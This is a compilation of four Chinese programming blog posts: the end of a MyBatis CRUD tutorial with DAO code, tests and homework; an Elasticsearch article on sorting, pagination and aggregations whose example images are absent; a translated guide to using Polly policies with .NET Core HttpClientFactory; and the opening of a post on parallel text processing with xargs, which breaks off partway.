        delete from student where id=#{id}
    </delete>

    <delete id="deleteStudents">
        delete from student where id in
        <foreach collection="list" item="id" open="(" separator="," close=")">
            #{id}
        </foreach>
    </delete>

</mapper>

View Code
 最终完成的数据访问类似：


package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Stu;
import com.zhangguo.mybatis03.entities.Student;
import com.zhangguo.mybatis03.utils.SqlSessionFactoryUtil;
import org.apache.ibatis.session.SqlSession;

import java.util.List;
import java.util.Map;

public class StudentDao implements StudentMapper {

    /**
     * 根据学生编号获得学生对象
     */
    public Student selectStudentById(int id) {
        Student entity = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询单个对象，指定参数为3
        entity = mapper.selectStudentById(id);

        //关闭
        SqlSessionFactoryUtil.closeSession(session);

        return entity;
    }

    /**
     * 获得学生总数
     */
    public long selectStudentsCount() {
        long count = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询单行单列，简单值
        count = mapper.selectStudentsCount();

        //关闭
        SqlSessionFactoryUtil.closeSession(session);

        return count;
    }


    /**
     * 根据学生姓名获得学生集合
     */
    public List<Student> selectStudentsByName(String name) {
        List<Student> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectStudentsByName(name);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }

    /**
     * 获得所有学生Map集合
     *
     */
    public List<Map<String, Object>> selectAllStudents() {
        List<Map<String, Object>> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectAllStudents();
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }

    /**
     * 根据性别获得学生集合
     *
     * @param sex
     */
    public List<Stu> selectStudentsBySex(String sex) {
        List<Stu> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectStudentsBySex(sex);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }

    /**
     * 根据学生姓名或性别获得学生集合
     *
     * @param name
     * @param sex
     */
    public List<Student> selectStudentsByNameOrSex(String name, String sex) {
        List<Student> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectStudentsByNameOrSex(name, sex);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }

    /**
     * 根据学生Id或性别获得学生集合
     *
     * @param param
     */
    public List<Student> selectStudentsByIdOrSex(Map<String, Object> param) {
        List<Student> entities = null;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //查询多个对象，指定参数
        entities = mapper.selectStudentsByIdOrSex(param);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return entities;
    }


    /**
     * 添加学生
     */
    public int insertStudent(Student entity) {
        //影响行数
        int rows = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //执行添加
        rows = mapper.insertStudent(entity);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 更新学生
     */
    public int updateStudent(Student entity) {
        //影响行数
        int rows = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //执行更新
        rows = mapper.updateStudent(entity);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 删除学生
     */
    public int deleteStudent(int id) {
        //影响行数
        int rows = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //执行删除
        rows = mapper.deleteStudent(id);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

    /**
     * 删除多个学生通过编号
     *
     * @param ids
     */
    public int deleteStudents(List<Integer> ids) {
        //影响行数
        int rows = 0;
        //打开一个会话
        SqlSession session = SqlSessionFactoryUtil.openSession(true);

        //获得一个映射器
        StudentMapper mapper = session.getMapper(StudentMapper.class);

        //执行删除
        rows = mapper.deleteStudents(ids);
        //关闭
        SqlSessionFactoryUtil.closeSession(session);
        return rows;
    }

}

View Code
 最终完成的接口：


package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Stu;
import com.zhangguo.mybatis03.entities.Student;
import org.apache.ibatis.annotations.Param;

import java.util.List;
import java.util.Map;

public interface StudentMapper {
    /**
     * 根据学生编号获得学生对象
     */
    Student selectStudentById(int id);

    /**
     * 获得学生总数
     * */
    long selectStudentsCount();

    /**
     * 根据学生姓名获得学生集合
     */
    List<Student> selectStudentsByName(String name);


    /**
     * 获得所有学生Map集合
     */
    List<Map<String,Object>> selectAllStudents();

    /**
     * 根据性别获得学生集合
     */
    List<Stu> selectStudentsBySex(String sex);

    /**
     * 根据学生姓名或性别获得学生集合
     */
    List<Student> selectStudentsByNameOrSex(@Param("realname") String name,@Param("sex") String sex);

    /**
     * 根据学生Id或性别获得学生集合
     */
    List<Student> selectStudentsByIdOrSex(Map<String,Object> param);


    /**
     * 添加学生
     */
    int insertStudent(Student entity);

    /**
     * 更新学生
     */
    int updateStudent(Student entity);

    /**
     * 删除学生
     */
    int deleteStudent(int id);

    /**
     * 删除多个学生通过编号
     */
    int deleteStudents(List<Integer> ids);
}

View Code
 最终完成的测试：


package com.zhangguo.mybatis03.dao;

import com.zhangguo.mybatis03.entities.Stu;
import com.zhangguo.mybatis03.entities.Student;
import org.junit.*;
import org.junit.runners.MethodSorters;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * StudentDao Tester.
 *
 * @author <Authors name>
 * @version 1.0
 * @since <pre>09/26/2018</pre>
 */
@FixMethodOrder(MethodSorters.JVM)//指定测试方法按定义的顺序执行
public class StudentDaoTest {
    StudentMapper dao;
    @Before
    public void before() throws Exception {
        dao=new StudentDao();
    }

    @After
    public void after() throws Exception {
    }

    /**
     * Method: selectStudentById(int id)
     */
    @Test
    public void testSelectStudentById() throws Exception {
        Student entity=dao.selectStudentById(1);
        System.out.println(entity);
        Assert.assertNotNull(entity);
    }

    //
    /**
     * Method: selectStudentsCount()
     */
    @Test
    public void testSelectStudentsCount() throws Exception {
        Assert.assertNotEquals(0,dao.selectStudentsCount());
    }
    /**
     * Method: selectStudentsByName(String name)
     */
    @Test
    public void testSelectStudentsByName() throws Exception {
        List<Student> students=dao.selectStudentsByName("C");
        System.out.println(students);
        Assert.assertNotNull(students);
    }

    /**
     * Method: selectAllStudents()
     */
    @Test
    public void testSelectAllStudents() throws Exception {
        List<Map<String,Object>>  students=dao.selectAllStudents();
        System.out.println(students);
        Assert.assertNotNull(students);
    }

    /**
     * Method: selectStudentsBySex(String sex)
     */
    @Test
    public void testSelectStudentsBySex() throws Exception {
        List<Stu> students=dao.selectStudentsBySex("boy");
        System.out.println(students);
        Assert.assertNotNull(students.get(0));
    }


    /**
     * Method: selectStudentsByIdOrSex
     */
    @Test
    public void testSelectStudentsByNameOrSex() throws Exception {
        Map<String ,Object> param=new HashMap<String,Object>();
        param.put("no",1);
        param.put("sex","girl");
        List<Student> students=dao.selectStudentsByIdOrSex(param);
        System.out.println(students);
        Assert.assertNotNull(students);
    }

    /**
     * Method: insertStudent
     */
    @Test
    public void testInsertStudent() throws Exception {
        Student entity=new Student();
        //entity.setName("张明");
        entity.setSex("boy");

        Assert.assertEquals(1,dao.insertStudent(entity));
    }

    /**
     * Method: updateStudent
     */
    @Test
    public void testUpdateStudent() throws Exception {
        Student entity=dao.selectStudentById(11);
        //entity.setName("张丽美");
        entity.setSex("girl");

        Assert.assertEquals(1,dao.updateStudent(entity));
    }

    /**
     * Method: deleteStudent
     */
    @Test
    public void testDeleteStudent() throws Exception {
        Assert.assertEquals(1,dao.deleteStudent(12));
    }



    /**
     * Method: deleteStudents
     */
    @Test
    public void testDeleteStudents() throws Exception {
        List<Integer> ids=new ArrayList<Integer>();
        ids.add(10);
        ids.add(11);
        Assert.assertEquals(2,dao.deleteStudents(ids));
    }
} 

View Code
五、示例源代码
https://git.coding.net/zhangguo5/MyBatis03.git
https://git.coding.net/zhangguo5/MyBatis02.git
六、视频
https://www.bilibili.com/video/av32447485/
七、作业
1、重现上所有上课示例
2、请使用Maven多模块+Git+MyBatis完成一个单表的管理功能，需要UI,可以AJAX也可以JSTL作表示层。
3、分页，多条件组合查询，多表连接（选作）
4、内部测试题（4个小时）
4.1、请实现一个简易图书管理系统（LibSystem），实现图书管理功能，要求如下：(初级)
1、管理数据库中所有图书（Books），包含图书编号（isbn）、书名（title）、作者（author）、价格（price）、出版日期（publishDate）
2、Maven多模块+MySQL+Git+MyBatis+JUnit单元测试
3、表示层可以是AJAX或JSTL
C10 R(10+10) U10 D10
 
4.2、请实现一个迷你图书管理系统（LibSystem），实现图书管理功能，要求如下：(中级)
1、管理数据库中所有图书分类（Categories），包含图书编号（id）,名称（name）
2、管理数据库中所有图书（Books），包含图书编号（isbn）、类别（categoryId，外键）书名（title）、作者（author）、价格（price）、出版日期（publishDate）、封面（cover）、详细介绍（details）
3、分页 10
4、多条件组件查询（3个以上的条件任意组合）(高级) 10
5、多删除 (高级) 10
6、上传封面 (高级) 10
7、富文本编辑器 (高级) 10

********************************************************************************************************************************************************************************************************
Elastic Stack-Elasticsearch使用介绍(四)
一、前言
    上一篇说了一下查询和存储机制，接下来我们主要来说一下排序、聚合、分页；
    写完文章以后发现之前文章没有介绍Coordinating Node，这个地方补充说明下Coordinating Node(协调节点):搜索请求或索引请求可能涉及保存在不同数据节点上的数据。例如，搜索请求在两个阶段中执行，当客户端请求到节点上这个阶段的时候，协调节点将请求转发到保存数据的数据节点。每个数据节点在分片执行请求并将其结果返回给协调节点。当节点返回到客端这个阶段的时候，协调节点将每个数据节点的结果减少为单个节点的所有数据的结果集。这意味着每个节点具有全部三个node.master，node.data并node.ingest这个属性,当node.ingest设置为false仅作为协调节点，不能被禁用。
二、排序
   ES默认使用相关性算分来排序，如果想改变排序规则可以使用sort:
   
  也可以指定多个排序条件:
   
   排序的过程是指是对字段原始内容排序的过程，在排序的过程中使用的正排索引，是通过文档的id和字段进行排序的；Elasticsearch针对这种情况提供两种实现方式:fielddata和doc_value;
   fielddata
   fielddata的数据结构，其实根据倒排索引反向出来的一个正排索引，即document到term的映射。只要我们针对需要分词的字段设置了fielddata，就可以使用该字段进行聚合，排序等。我们设置为true之后，在索引期间，就会以列式存储在内存中。为什么存在于内存呢，因为按照term聚合，需要执行更加复杂的算法和操作，如果基于磁盘或者 OS 缓存，性能会比较差。用法如下:
   
   fielddata加载到内存中有几种情况，默认是懒加载。即对一个分词的字段执行聚合或者排序的时候，加载到内存。所以他不是在索引创建期间创建的，而是查询在期间创建的。
   fielddata在内存中加载的这样就会出现一个问题，数据量很大的情况容易发生OOM，这种时候我们该如何控制OOM的情况发生?
   1.内存限制
   indices.fielddata.cache.size: 20% 默认是无限制，限制内存使用以后频繁的导致内存回收，容易照成GC和IO损耗。
   2.断路器(circuit breaker)
   如果查询一次的fielddata超过总内存，就会发生内存溢出，circuit breaker会估算query要加载的fielddata大小，如果超出总内存，就短路，query直接失败;
   indices.breaker.fielddata.limit：fielddata的内存限制，默认60%
   indices.breaker.request.limit：执行聚合的内存限制，默认40%
   indices.breaker.total.limit：综合上面两个，限制在70%以内
   3.频率(frequency)
   加载fielddata的时候，也是按照segment去进行加载的，所以可以通过限制segment文档出现的频率去限制加载的数目；
   min :0.01 只是加载至少1%的doc文档中出现过的term对应的文档;
   min_segment_size: 500 少于500 文档数的segment不加载fielddata;
   fielddata加载方式:
   1.lazy
   这个在查询的放入到内存中，上面已经介绍过；
   2.eager(预加载)
   当一个新的segment形成的时候，就加载到内存中，查询的时候遇到这个segment直接查询出去就可以；
   3.eager_global_ordinals(全局序号加载)
   构建一个全局的Hash,新出现的文档加入Hash，文档中用序号代替字符，这样会减少内存的消耗，但是每次要是有segment新增或者删除时候回导致全局序号重建的问题；
   doc_value
   fielddata对内存要求比较高，如果数据量很大的话对内存是一个很大的考验。所以Elasticsearch又给我们提供了另外的策略doc_value,doc_value使用磁盘存储，与fielddata结构完全是一样的，在倒排索引基础上反向出来的正排索引，并且是预先构建，即在建倒排索引的时候，就会创建doc values。,这会消耗额外的存储空间，但是对于JVM的内存需求就会减少。总体来看，dov_valus只是比fielddata慢一点，大概10-25%，则带来了更多的稳定性。
   类型是string的字段，生成分词字段(text)和不分词字段(keyword)，不分词字段即使用keyword，所以我们在聚合的时候，可以直接使用field.keyword进行聚合，而这种默认就是使用doc_values，建立正排索引。不分词的字段，默认建立doc_values,即字段类型为keyword，他不会创建分词，就会默认建立doc_value，如果我们不想该字段参与聚合排序，我们可以设置doc_values=false，避免不必要的磁盘空间浪费。但是这个只能在索引映射的时候做，即索引映射建好之后不能修改。
   两者对比:
   
三、分页
   有3种类型的分页,如下图:
   
   1.from/size
   form开始的位置，size获取的数量；
   
   数据在分片存储的情况下怎么查询前1000个文档?
   在每个分片上都先获取1000个文档，然后再由Coordinating Node聚合所有分片的结果后再排序选取前1000个文档,页数越多，处理文档就越多，占用内存越多，耗时越长。数据分别存放在不同的分片上，必须一个去查询；为了避免深度分页，Elasticsearch通过index.max_result_window限定显示条数，默认是10000；
   
   2.scroll
   scroll按照快照的方式来查询数据,可以避免深度分页的问题，因为是快照所以不能用来做实时搜索，数据不是实时的，接下来说一下scroll流程:
   首先发起scroll查询请求，Elasticsearch在接收到请求以后会根据查询条件查询文档i，1m表示该快照保留1分钟；
   
   接下来查询的时候根据上一次返回的快照id继续查询，不断的迭代调用直到返回hits.hits数组为空时停止
   
  过多的scroll调用会占用大量的内存，可以通过删除的clear api进行删除：
  删除某个:
  
 删除多个：
 
 删除所有:
 
 3.search after
 避免深度分页的性能问题，提供实时的下一页文档获取功能，通过提供实时游标来解决此问题，接下来我们来解释下这个问题:
 第一次查询:这个地方必须保证排序的值是唯一的
 
 第二步: 使用上一步最后一个文档的sort值进行查询
 
  通过保证排序字段唯一，我们实现类似数据库游标功能的效果； 
四、聚合分析
  Aggregation，是Elasticsearch除搜索功能外提供的针对Elasticsearch数据做统计分析的功能,聚合的实时性很高，都是及时返回，另外还提供多种分析方式，接下来我们看下聚合的4种分析方式:
  Metric
  在一组文档中计算平均值、最大值、最小值、求和等等； 
  Avg(平均值)
  
 
Min最小值


Sum求和(过滤查询中的结果查询出帽子的价格的总和)


Percentile计算从聚合文档中提取的数值的一个或多个百分位数;
解释下下面这个例子，网站响应时间做的一个分析，单位是毫秒，5毫秒响应占总响应时间的1%；


 Cardinality计算不同值的近似计数,类似数据库的distinct count


当然除了上面还包括很多类型，更加详细的内容可以参考官方文档;
Bucket
按照一定的规则将文档分配到不同的桶里，达到分类分析的目的；
比如把年龄小于10放入第一个桶，大于10小于30放入第二个桶里，大于30放到第三个桶里；

接下来我们介绍我们几个常用的类型:
Date Range
根据时间范围来划分桶的规则；


to表示小于当前时间减去10个月；from大于当前时间减去10个月；format设定返回格式；form和to还可以指定范围，大于某时间小于某时间；
Range
通过自定义范围来划分桶的规则；


这样就可以轻易做到上面按照年龄分组统计的规则；
Terms
直接按照term分桶，类似数据库group by以后求和，如果是text类型则按照分词结果分桶；


比较常用的类型大概就是这3种，比如还有什么Histogram等等，大家可以参考官方文档；
Pipeline
对聚合的结果在次进行聚合分析，根据输出的结果不同可以分成2类:
Parent
将返回的结果内嵌到现有的聚合结果中，主要有3种类型:
1.Derivative
计算Bucket值的导数;
2.Moving Average
计算Bucket值的移动平均值，一定时间段，对时间序列数据进行移动计算平均值;
3.Cumulatove Sum
计算累计加和;
Sibling
返回的结果与现有聚合结果同级；
1.Max/Min/Avg/Sum
2.Stats/Extended
Stats用于计算聚合中指定列的所有桶中的各种统计信息；
Extended对Stats的扩展，提供了更多统计数据（平方和，标准偏差等）；
3.Percentiles 
Percentiles 计算兄弟中指定列的所有桶中的百分位数；
更多介绍，请参考官方文档；
Matrix
矩阵分析,使用不多，参考官方文档;
原理探讨与数据准确性探讨:
Min原理分析:
先从每个分片计算最小值 -> 再从这些值中计算出最小值

Terms聚合以及提升计算值的准确性：
Terms聚合的执行流程：每个分片返回top10的数据，Coordinating node拿到数据之后进行整合和排序然后返回给用户。注意Terms并不是永远准确的，因为数据分散在多个分片上，所以Coordinating node无法得到所有数据(这句话有同学会有疑惑请查看上一篇文章)。如果要解决可以把分片数设置为1，消除数据分散的问题，但是会分片数据过多问题，或者设在Shard_Size大小，即每次从Shard上额外多获取的数据，以提升准确度。
Terms聚合返回结果中有两个值：
doc_count_error_upper_bound 被遗漏的Term的最大值；
sum_other_doc_count 返回聚合的其他term的文档总数；
在Terms中设置show_term_doc_count_error可以查看每个聚合误算的最大值；
Shard_Size默认大小：shard_size = (size*1.5)+10；
通过调整Shard_Size的大小可以提升准确度，增大了计算量降低响应的时间。
由上面可以得出在Elasticsearch聚合分析中，Cardinality和Percentile分析使用是近似统计算法，就是结果近似准确但是不一定精确，可以通过参数的调整使其结果精确，意味着会有更多的时间和更大的性能消耗。
五、结束语
Search分析到此基本结束，下一篇介绍一些常用的优化手段和建立索引时的考虑问题；欢迎大家加群438836709，欢迎大家关注我公众号！


********************************************************************************************************************************************************************************************************
在 .NET Core 中结合 HttpClientFactory 使用 Polly（中篇）


译者：王亮作者：Polly 团队原文：http://t.cn/EhZ90oq声明：我翻译技术文章不是逐句翻译的，而是根据我自己的理解来表述的（包括标题）。其中可能会去除一些不影响理解但本人实在不知道如何组织的句子






译者序：这是“Polly and HttpClientFactory”这篇Wiki文档翻译的中篇，你可以 点击这里查看上篇。接下来的两篇则是在这个基础上进行加强。本篇（中篇）主要讲如何在ASP.NET Core中通过HttpClientFactory配置Polly策略。如果你对ASP.NET Core 2.1新引入的HttpClient工厂还比较陌生，建议先阅读我的另一篇文章 .NET Core中正确使用 HttpClient的姿势，这有助于更好地理解本文。
—— 正文 ——
下面主要讲如何在ASP.NET Core中通过HttpClientFactory配置Polly策略。
使用 AddTransientHttpErrorPolicy
让我们先回到上篇的例子：
services.AddHttpClient("GitHub", client =>{    client.BaseAddress = new Uri("https://api.github.com/");    client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.v3+json");}).AddTransientHttpErrorPolicy(builder => builder.WaitAndRetryAsync(new[]{    TimeSpan.FromSeconds(1),    TimeSpan.FromSeconds(5),    TimeSpan.FromSeconds(10)}));

这里用了一个新的AddTransientHttpErrorPolicy方法，它可以很方便地配置一个策略来处理下面这些典型的HTTP调用错误：

网络错误（HttpRequestException 异常）
HTTP状态码 5XX（服务器错误）
HTTP状态码 408（请求超时）

AddTransientHttpErrorPolicy方法添加了一个策略，这个策略默认预配置了上面HTTP错误的过滤器。在builder => builder子句中，你可以定义策略如何处理这些错误，还可以配置Polly提供的其它策略，比如重试（如上例所示）、断路或回退等。
在AddTransientHttpErrorPolicy中处理网络错误、HTTP 5XX和HTTP 408是一种便捷的方式，但这不是必需的。如果此方法内置的错误过滤器不适合您的需要（你需要仔细考虑一下），您可以扩展它，或者构建一个完全定制的Polly策略。
扩展 AddTransientHttpErrorPolicy
AddTransientHttpErrorPolicy方法也可以从Polly的一个扩展包Polly.Extensions.Http中得到，它在上面的基础上进行了扩展。例如下面配置的策略可以处理429状态码：
using Polly.Extensions.Http;// ...var policy = HttpPolicyExtensions  .HandleTransientHttpError() // HttpRequestException, 5XX and 408  .OrResult(response => (int)response.StatusCode == 429) // RetryAfter  .WaitAndRetryAsync(/* etc */);

使用典型Polly语法配置好的策略
Polly 还有另一个扩展方法是AddPolicyHandler，它的一个重载方法可以接收任意IAsyncPolicy参数，所以你可以用典型的Polly语法先定义好任意的一个策略（返回类型为IAsyncPolicy），然后再传给AddPolicyHandler扩展方法。
下面这个例子演示了用AddPolicyHandler来添加一个策略，其中我们编写了自己的错误处理策略：
var retryPolicy = Policy.Handle<HttpRequestException>()    .OrResult<HttpResponseMessage>(response => MyCustomResponsePredicate(response))    .WaitAndRetryAsync(new[]    {        TimeSpan.FromSeconds(1),        TimeSpan.FromSeconds(5),        TimeSpan.FromSeconds(10)    }));services.AddHttpClient("GitHub", client =>{    client.BaseAddress = new Uri("https://api.github.com/");    client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.v3+json");}).AddPolicyHandler(retryPolicy);

类似的，你还可以配置其它策略，比如超时策略：
var timeoutPolicy = Policy.TimeoutAsync<HttpResponseMessage>(10);services.AddHttpClient(/* etc */)    .AddPolicyHandler(timeoutPolicy);

所有通过HttpClient的调用返回的都是一个HttpResponseMessage对象，因此配置的策略必须是IAsyncPolicy对象（译注：HTTP请求返回的是HttpResponseMessage对象，Polly定义的策略是一个IAsyncPolicy对象，所以AddPolicyHandler方法接收的参数是这两者的结合体IAsyncPolicy对象）。非泛型的IAsyncPolicy可以通过下面的方式转换成泛型的IAsyncPolicy：
var timeoutPolicy = Policy.TimeoutAsync(10);services.AddHttpClient(/* etc */)    .AddPolicyHandler(timeoutPolicy.AsAsyncPolicy<HttpResponseMessage>());

应用多个策略
所有策略配置的方法也可以链式地配置多个策略，例如：
services.AddHttpClient(/* etc */)    .AddTransientHttpErrorPolicy(builder => builder.WaitAndRetryAsync(new[]    {        TimeSpan.FromSeconds(1),        TimeSpan.FromSeconds(5),        TimeSpan.FromSeconds(10)    }))    .AddTransientHttpErrorPolicy(builder => builder.CircuitBreakerAsync(        handledEventsAllowedBeforeBreaking: 3,        durationOfBreak: TimeSpan.FromSeconds(30)    ));

多个策略被应用的顺序
当您配置多个策略时（如上例所示），策略应用于从外部（第一次配置）到内部（最后配置）的顺序依次调用。在上面的示例中，调用的顺序是这样的：

首先通过（外部）重试策略，该策略将依次：
通过（内部）断路策略的调用，该策略将依次：
进行底层HTTP调用。


这个示例之所以用此顺序的策略是因为当重试策略在两次尝试之间等待时，断路器可能在其中一个时间段（1、5或10秒）内改变状态（译注：上面示例中断路策略是出现3次异常就“休息”30分钟）。断路策略被配置在重试策略的内部，因此每执行一次重试就会执行其内部的断路策略。
上面的例子应用了两个策略（重试和断路），任意数量的策略都是可以的。一个常见的多个策略组合可能是这样的：重试、断路和超时（“下篇”会有例子）。
对于那些熟悉Polly的策略包的人来说，使用上面的方式配置多个策略完全等同于使用策略包，也适用于所有“策略包的使用建议”（链接：http://t.cn/EhJ4jfN）。
动态选择策略
AddPolicyHandler的重载方法允许你根据HTTP请求动态选择策略。
其中一个用例是对非等幂的操作应用不同的策略行为（译注：“等幂“指的是一个操作重复使用，始终都会得到同一个结果）。对于HTTP请求来说，POST操作通常不是幂等的（译注：比如注册），PUT操作应该是幂等的。所以对于给定的API可能不是一概而论的。比如，您可能想要定义一个策略，让它只重试GET请求，但不重试其他HTTP谓词，比如这个示例：
var retryPolicy = HttpPolicyExtensions    .HandleTransientHttpError()    .WaitAndRetryAsync(new[]    {        TimeSpan.FromSeconds(1),        TimeSpan.FromSeconds(5),        TimeSpan.FromSeconds(10)    });var noOpPolicy = Policy.NoOpAsync().AsAsyncPolicy<HttpResponseMessage>();services.AddHttpClient(/* etc */)    // 如果是GET请求，则使用重试策略，否则使用空策略    .AddPolicyHandler(request => request.Method == HttpMethod.Get ? retryPolicy : noOpPolicy);

上面的空策略会被应用于所有非GET的请求。空策略只是一种占坑模式，实际上不做任何事情。
从策略的注册池中选择策略
Polly还提供了策略注册池（请参阅：http://t.cn/Ehi1SQp ），它相当于策略的存储中心，被注册的策略可以让你在应用程序的多个位置重用。AddPolicyHandler的一个重载方法允许您从注册池中选择策略。
下面的示例使用IServiceCollection添加一个策略注册池服务，向注册池中添加一些策略，然后使用注册池中的不同策略定义两个调用逻辑。
var registry = services.AddPolicyRegistry();registry.Add("defaultretrystrategy",     HttpPolicyExtensions.HandleTransientHttpError().WaitAndRetryAsync(/* etc */));registry.Add("defaultcircuitbreaker",     HttpPolicyExtensions.HandleTransientHttpError().CircuitBreakerAsync(/* etc */));services.AddHttpClient(/* etc */)    .AddPolicyHandlerFromRegistry("defaultretrystrategy");services.AddHttpClient(/* etc */)    .AddPolicyHandlerFromRegistry("defaultretrystrategy")    .AddPolicyHandlerFromRegistry("defaultcircuitbreaker");

这个示例演示了从注册池中选择一个或多个策略应用在不同的HttpClient上，同一个策略被重复使用了两次。策略注册池的更复杂用例包括从外部动态更新注册池中的策略，以便在运行期间动态重新配置策略（请查阅 http://t.cn/Ehidgqy 了解更多）。
相关阅读：
.NET 开源项目 Polly 介绍
在 .NET Core 中结合 HttpClientFactory 使用 Polly（上篇）
在 .NET Core 中结合 HttpClientFactory 使用 Polly（下篇）

********************************************************************************************************************************************************************************************************
shell高效处理文本(1)：xargs并行处理
xargs具有并行处理的能力，在处理大文件时，如果应用得当，将大幅提升效率。
xargs详细内容(全网最详细)：https://www.cnblogs.com/f-ck-need-u/p/5925923.html
效率提升测试结果
先展示一下使用xargs并行处理提升的效率，稍后会解释下面的结果。
测试环境：

win10子系统上

32G内存

8核心cpu

测试对象是一个放在固态硬盘上的10G文本文件(如果你需要此测试文件，点此下载，提取码: semu)

下面是正常情况下wc -l统计这个10G文件行数的结果，花费16秒，多次测试，cpu利用率基本低于80%。
$ /usr/bin/time wc -l 9.txt
999999953 9.txt
4.56user 3.14system 0:16.06elapsed 47%CPU (0avgtext+0avgdata 740maxresident)k
0inputs+0outputs (0major+216minor)pagefaults 0swaps
通过分割文件，使用xargs的并行处理功能进行统计，花费时间1.6秒，cpu利用率752%：
$ /usr/bin/time ./b.sh
999999953
7.67user 4.54system 0:01.62elapsed 752%CPU (0avgtext+0avgdata 1680maxresident)k
0inputs+0outputs (0major+23200minor)pagefaults 0swaps
用grep从这个10G的文本文件中筛选数据，花费时间24秒，cpu利用率36%：
$ /usr/bin/time grep "10000" 9.txt >/dev/null
6.17user 2.57system 0:24.19elapsed 36%CPU (0avgtext+0avgdata 1080maxresident)k
0inputs+0outputs (0major+308minor)pagefaults 0swaps
通过分割文件，使用xargs的并行处理功能进行统计，花费时间1.38秒，cpu利用率746%：
$ /usr/bin/time ./a.sh
6.01user 4.34system 0:01.38elapsed 746%CPU (0avgtext+0avgdata 1360maxresident)k
0inputs+0outputs (0major+31941minor)pagefaults 0swaps
速度提高的不是一点点。
xargs并行处理简单示例
要使用xargs的并行功能，只需使用"-P N"选项即可，其中N是指定要运行多少个并行进程，如果指定为0，则使用尽可能多的并行进程数量。
需要注意的是：

既然要并行，那么xargs必须得分批传送管道的数据，xargs的分批选项有"-n"、"-i"、"-L"，如果不知道这些内容，看本文开头给出的文章。

并行进程数量应该设置为cpu的核心数量。如果设置为0，在处理时间较长的情况下，很可能会并发几百个甚至上千个进程。在我测试一个花费2分钟的操作时，创建了500多个进程。

在本文后面，还给出了其它几个注意事项。

例如，一个简单的sleep命令，在不使用"-P"的时候，默认是一个进程按批的先后进行处理：
[root@xuexi ~]# time echo {1..4} | xargs -n 1 sleep
 
real    0m10.011s
user    0m0.000s
sys     0m0.011s
总共用了10秒，因为每批传一个参数，第一批睡眠1秒，然后第二批睡眠2秒，依次类推，还有3秒、4秒，共1+2+3+4=10秒。
如果使用-P指定4个处理进程，它将以处理时间最长的为准：
[root@xuexi ~]# time echo {1..4} | xargs -n 1 -P 4 sleep
 
real    0m4.005s
user    0m0.000s
sys     0m0.007s
再例如，find找到一大堆文件，然后用grep去筛选：
find /path -name "*.log" | xargs -i grep "pattern" {}
find /path -name "*.log" | xargs -P 4 -i grep "pattern" {}
上面第一个语句，只有一个grep进程，一次处理一个文件，每次只被其中一个cpu进行调度。也就是说，它无论如何，都只用到了一核cpu的运算能力，在极端情况下，cpu的利用率是100%。
上面第二个语句，开启了4个并行进程，一次可以处理从管道传来的4个文件，在同一时刻这4个进程最多可以被4核不同的CPU进行调度，在极端情况下，cpu的利用率是400%。
并行处理示例
下面是文章开头给出的实验结果对应的示例。一个10G的文本文件9.txt，这个文件里共有9.9亿(具体的是999999953)行数据。
首先一个问题是，怎么统计这么近10亿行数据的？wc -l，看看时间花费。
$ /usr/bin/time wc -l 9.txt
999999953 9.txt
4.56user 3.14system 0:16.06elapsed 47%CPU (0avgtext+0avgdata 740maxresident)k
0inputs+0outputs (0major+216minor)pagefaults 0swaps
总共花费了16.06秒，cpu利用率是47%。
随后，我把这10G数据用split切割成了100个小文件，在提升效率方面，split切割也算是妙用无穷：
split -n l/100 -d -a 3 9.txt fs_
这100个文件，每个105M，文件名都以"fs_"为前缀：
$ ls -lh fs* | head -n 5
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_000
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_001
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_002
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_003
-rwxrwxrwx 1 root root 105M Oct  6 17:31 fs_004
然后，用xargs的并行处理来统计，以下是统计脚本b.sh的内容：
#!/usr/bin/env bash

find /mnt/d/test -name "fs*" |\
 xargs -P 0 -i wc -l {} |\
 awk '{sum += $1}END{print sum}'
